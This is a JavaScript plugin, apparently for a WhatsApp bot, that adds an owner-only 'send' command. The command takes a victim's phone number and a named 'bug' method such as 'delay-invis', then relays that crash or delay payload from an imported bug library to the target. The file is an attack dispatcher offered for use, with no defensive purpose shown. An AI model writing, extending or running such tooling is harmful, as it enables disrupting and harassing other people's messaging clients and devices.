/**
 * @file Bug send command
 * @module plugins/owner/send
 */

import { bugMethods } from "#lib/bug.js";

let handler = async (m, { sock, args, usedPrefix, command }) => {
    if (!args[0] || !args[1]) {
        return m.reply(`*Wrong Format!*\n\n*Usage:* ${usedPrefix + command} <number> <method>\n*Example:* ${usedPrefix + command} 628xxx delay-invis`);
    }

    let target = args[0].replace(/[^0-9]/g, "");
    const method = args[1]?.toLowerCase();

    if (!target.endsWith("@s.whatsapp.net")) {
        target += "@s.whatsapp.net";
    }

    if (!bugMethods[method]) {
        return m.reply(`❌ Method *${method}* not found.\nType *.methods* to see the list.`);
    }

    await m.reply(`🚀 Sending bug *${method}* to target *${target}*...`);

    try {
        // As per user case: await protocolbug8(isTarget, true)
        await bugMethods[method](sock, target, true);
        await m.reply(`✅ Successfully relayed bug *${method}* to the target.`);
    } catch (e) {
        sock.logger.error(e);
        await m.reply(`❌ Failed to send bug: ${e.message}`);
    }
};

handler.help = ["send"];
handler.tags = ["owner"];
handler.command = /^(send)$/i;
handler.owner = true;

export default handler;
